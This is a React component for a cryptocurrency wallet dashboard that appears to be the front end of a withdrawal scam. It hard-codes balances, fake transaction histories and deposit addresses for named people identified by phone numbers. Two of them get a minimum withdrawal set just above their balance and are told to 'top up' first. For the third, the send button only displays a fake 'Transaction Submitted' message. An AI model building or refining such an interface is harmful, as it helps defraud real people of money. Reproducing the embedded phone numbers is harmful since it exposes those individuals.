import { useState, useEffect } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { useToast } from "@/hooks/use-toast";
import { 
  Wallet, 
  TrendingUp, 
  TrendingDown, 
  RefreshCw,
  Send,
  Download,
  Eye,
  EyeOff,
  LogOut,
  Copy
} from "lucide-react";

interface WalletDashboardProps {
  onLogout: () => void;
  userData: { phone: string; name: string };
}

const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
  const [btcPrice, setBtcPrice] = useState(0);
  const [ethPrice, setEthPrice] = useState(0);
  const [isBalanceVisible, setIsBalanceVisible] = useState(true);
  const [lastUpdated, setLastUpdated] = useState(new Date());
  const [isLoading, setIsLoading] = useState(true);
  const [isSendDialogOpen, setIsSendDialogOpen] = useState(false);
  const [isReceiveDialogOpen, setIsReceiveDialogOpen] = useState(false);
  const [isComplianceDialogOpen, setIsComplianceDialogOpen] = useState(true);
  const [sendAmount, setSendAmount] = useState("");
  const [sendAddress, setSendAddress] = useState("");
  const { toast } = useToast();
  
  // User-specific data
  const isJoanne = userData.phone === "0061414491726";
  const isJan = userData.phone === "447703277077";
  
  const cryptoBalance = isJoanne ? 460.083896 : isJan ? 15.42 : 44.62;
  const cryptoSymbol = isJan ? "ETH" : "BTC";
  const currentPrice = isJan ? ethPrice : btcPrice;
  const minWithdrawal = isJoanne ? 460.10 : isJan ? 15.5 : 45;
  const usdValue = cryptoBalance * currentPrice;

  // Fetch real crypto prices
  const fetchCryptoPrices = async () => {
    try {
      const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum&vs_currencies=usd');
      const data = await response.json();
      setBtcPrice(data.bitcoin.usd);
      setEthPrice(data.ethereum.usd);
      setLastUpdated(new Date());
      setIsLoading(false);
    } catch (error) {
      console.error('Error fetching crypto prices:', error);
      setBtcPrice(67420.50); // Fallback price
      setEthPrice(2580.25); // Fallback price
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetchCryptoPrices();
    
    // Update price every 30 seconds
    const interval = setInterval(fetchCryptoPrices, 30000);
    return () => clearInterval(interval);
  }, []);

  const joanneTransactions = [
    { 
      id: "5", 
      type: "received", 
      amount: 0.017, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "bc1qcx...",
      status: "rejected"
    },
    { 
      id: "4", 
      type: "received", 
      amount: 0.0285, 
      date: new Date().toISOString().split('T')[0], 
      time: "11:06",
      hash: "bc1qbx..." 
    },
    { 
      id: "3", 
      type: "received", 
      amount: 0.028019, 
      date: "2025-08-22", 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "bc1qaw..." 
    },
    { 
      id: "2", 
      type: "received", 
      amount: 0.027377, 
      date: "2025-08-20", 
      time: "11:37",
      hash: "bc1qzx..." 
    },
    { 
      id: "1", 
      type: "received", 
      amount: 460, 
      date: "2025-08-14", 
      hash: "bc1qxy..." 
    }
  ];

  const dorothyTransactions = [
    { 
      id: "1", 
      type: "received", 
      amount: 44.62, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "bc1qdx..." 
    }
  ];

  const janTransactions = [
    { 
      id: "1", 
      type: "received", 
      amount: 15.42, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "0x2f0e..." 
    }
  ];

  const transactions = isJoanne ? joanneTransactions : isJan ? janTransactions : dorothyTransactions;

  const depositAddress = isJoanne ? "bc1qhvley3tp7rs0fs8w867jw0t5ufsnmazg9djutu" : 
                        isJan ? "0x2f0e82c630BBe25e2A5D765431Eaea05B331afce" : 
                        "bc1q5zrug4njmyzq8q0xk9mhep0uct3j67lvdptz0l";

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast({
        title: "Copied to clipboard",
        description: "Address has been copied successfully",
      });
    } catch (err) {
      console.error('Failed to copy: ', err);
      toast({
        title: "Copy failed",
        description: "Please copy the address manually",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen bg-background p-4">
      <div className="max-w-4xl mx-auto space-y-6">
        {/* Header */}
        <div className="flex justify-between items-center">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 bg-primary/20 rounded-full flex items-center justify-center">
              <Wallet className="w-6 h-6 text-primary" />
            </div>
            <div>
              <h1 className="text-2xl font-bold">Commercial Wallet سلام</h1>
              <p className="text-muted-foreground">{userData.phone}</p>
              <p className="text-sm text-muted-foreground">{userData.name}</p>
            </div>
          </div>
          <Button variant="ghost" onClick={onLogout}>
            <LogOut className="w-4 h-4 mr-2" />
            Logout
          </Button>
        </div>

        {/* Balance Card */}
        <Card className="p-6 shadow-card-custom border-0">
          <div className="flex justify-between items-start mb-4">
            <div>
              <div className="flex items-center space-x-2 mb-2">
                <h2 className="text-lg font-semibold">{cryptoSymbol} Balance</h2>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => setIsBalanceVisible(!isBalanceVisible)}
                >
                  {isBalanceVisible ? <Eye className="w-4 h-4" /> : <EyeOff className="w-4 h-4" />}
                </Button>
              </div>
              
              {isBalanceVisible ? (
                <>
                  <p className="text-3xl font-bold text-primary mb-1">
                    {cryptoBalance} {cryptoSymbol}
                  </p>
                  <p className="text-xl text-muted-foreground">
                    ${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
                  </p>
                </>
              ) : (
                <>
                  <p className="text-3xl font-bold text-primary mb-1">••••••</p>
                  <p className="text-xl text-muted-foreground">••••••••</p>
                </>
              )}
            </div>
            
            <div className="text-right">
              <Badge className="bg-primary/20 text-primary mb-2">
                Live Price
              </Badge>
              <p className="text-lg font-semibold">
                {isLoading ? 'Loading...' : `$${currentPrice.toLocaleString('en-US', { minimumFractionDigits: 2 })}`}
              </p>
              <p className="text-sm text-muted-foreground">
                Updated: {lastUpdated.toLocaleTimeString()}
              </p>
            </div>
          </div>

          <div className="flex space-x-3 mt-6">
            <Button 
              className="flex-1" 
              variant="premium"
              onClick={() => setIsSendDialogOpen(true)}
            >
              <Send className="w-4 h-4 mr-2" />
              Send
            </Button>
            <Button 
              className="flex-1" 
              variant="trading"
              onClick={() => setIsReceiveDialogOpen(true)}
            >
              <Download className="w-4 h-4 mr-2" />
              Receive
            </Button>
            <Button variant="ghost">
              <RefreshCw className="w-4 h-4" />
            </Button>
          </div>
        </Card>

        {/* Recent Transactions */}
        <Card className="p-6 shadow-card-custom border-0">
          <h2 className="text-xl font-semibold mb-4">Recent Transactions</h2>
          <div className="space-y-3">
            {transactions.map((tx) => (
              <div 
                key={tx.id}
                className="flex items-center justify-between p-4 bg-background/50 rounded-lg"
              >
                 <div className="flex items-center space-x-4">
                   <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                     tx.status === 'pending' ? 'bg-destructive/20' : 
                     tx.status === 'rejected' ? 'bg-destructive/20' :
                     tx.type === 'received' ? 'bg-bull/20' : 'bg-bear/20'
                   }`}>
                     {tx.type === 'received' ? (
                       <TrendingUp className={`w-5 h-5 ${
                         tx.status === 'pending' ? 'text-destructive' : 
                         tx.status === 'rejected' ? 'text-destructive' : 'text-bull'
                       }`} />
                     ) : (
                       <TrendingDown className={`w-5 h-5 text-bear`} />
                     )}
                   </div>
                   <div>
                     <p className="font-semibold capitalize">
                       {tx.status === 'pending' ? 'Pending' : 
                        tx.status === 'rejected' ? 'Rejected' : tx.type}
                     </p>
                     <p className="text-sm text-muted-foreground">
                       {tx.date} {tx.time && `at ${tx.time}`}
                     </p>
                   </div>
                 </div>
                 
                 <div className="text-right">
                    <p className={`font-semibold ${
                      tx.status === 'pending' ? 'text-destructive' :
                      tx.status === 'rejected' ? 'text-destructive' :
                      tx.type === 'received' ? 'text-bull' : 'text-bear'
                    }`}>
                      {tx.type === 'received' ? '+' : '-'}{tx.amount} {cryptoSymbol}
                    </p>
                   <p className="text-sm text-muted-foreground">{tx.hash}</p>
                 </div>
              </div>
            ))}
          </div>
        </Card>

        {/* Quick Stats */}
        <div className="grid grid-cols-2 gap-4">
            <Card className="p-4 shadow-card-custom border-0">
            <div className="text-center">
              <p className="text-sm text-muted-foreground">24h Change</p>
              <p className="text-lg font-bold text-bull">+$2,340.50</p>
              <p className="text-sm text-bull">+3.6%</p>
            </div>
          </Card>
          
          <Card className="p-4 shadow-card-custom border-0">
            <div className="text-center">
              <p className="text-sm text-muted-foreground">Portfolio Value</p>
              <p className="text-lg font-bold">${usdValue.toLocaleString('en-US', { maximumFractionDigits: 0 })}</p>
              <p className="text-sm text-primary">1 Asset</p>
            </div>
          </Card>
        </div>
      </div>

      {/* Send Dialog */}
      <Dialog open={isSendDialogOpen} onOpenChange={setIsSendDialogOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Withdrawal Notice</DialogTitle>
          </DialogHeader>
          <div className="text-center py-6">
            {isJan ? (
              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-sm font-medium">Amount ({cryptoSymbol})</label>
                  <Input
                    type="number"
                    placeholder={`Enter amount in ${cryptoSymbol}`}
                    value={sendAmount}
                    onChange={(e) => setSendAmount(e.target.value)}
                    step="0.000001"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-medium">Recipient Address</label>
                  <Input
                    type="text"
                    placeholder="Enter Ethereum address"
                    value={sendAddress}
                    onChange={(e) => setSendAddress(e.target.value)}
                  />
                </div>
                <Button 
                  onClick={() => {
                    if (sendAmount && sendAddress) {
                      toast({
                        title: "Transaction Submitted",
                        description: `Sending ${sendAmount} ${cryptoSymbol} to ${sendAddress.slice(0, 10)}...`,
                      });
                      setSendAmount("");
                      setSendAddress("");
                      setIsSendDialogOpen(false);
                    } else {
                      toast({
                        title: "Error",
                        description: "Please fill in both amount and address",
                        variant: "destructive",
                      });
                    }
                  }}
                  className="w-full"
                >
                  Confirm Transaction
                </Button>
              </div>
            ) : (
              <>
                <p className="text-lg text-muted-foreground">
                  Minimum withdrawal is <span className="font-bold text-primary">{minWithdrawal} {cryptoSymbol}</span>
                </p>
                <p className="text-muted-foreground mt-2">
                  Please top up to be able to withdraw.
                </p>
              </>
            )}
          </div>
          {!isJan && (
            <Button onClick={() => setIsSendDialogOpen(false)} className="w-full">
              OK
            </Button>
          )}
        </DialogContent>
      </Dialog>

      {/* Receive Dialog */}
      <Dialog open={isReceiveDialogOpen} onOpenChange={setIsReceiveDialogOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Your Deposit Address</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <div className="p-4 bg-muted rounded-lg">
              <p className="text-sm font-mono break-all text-center">
                {depositAddress}
              </p>
            </div>
            <Button 
              onClick={() => copyToClipboard(depositAddress)}
              className="w-full"
              variant="outline"
            >
              <Copy className="w-4 h-4 mr-2" />
              Copy Address
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Compliance Dialog */}
      <Dialog open={isComplianceDialogOpen} onOpenChange={setIsComplianceDialogOpen}>
        <DialogContent className="sm:max-w-lg">
          <DialogHeader>
            <DialogTitle>Security & Compliance Notice</DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <p className="text-muted-foreground leading-relaxed">
              For security and compliance purposes, please only deposit cryptocurrencies that originate from your own personal wallets or accounts. Funds received from unknown or third-party sources may be subject to review, frozen, or rejected. Thank you for your cooperation.
            </p>
          </div>
          <Button 
            onClick={() => setIsComplianceDialogOpen(false)}
            className="w-full"
          >
            I UNDERSTAND
          </Button>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default WalletDashboard;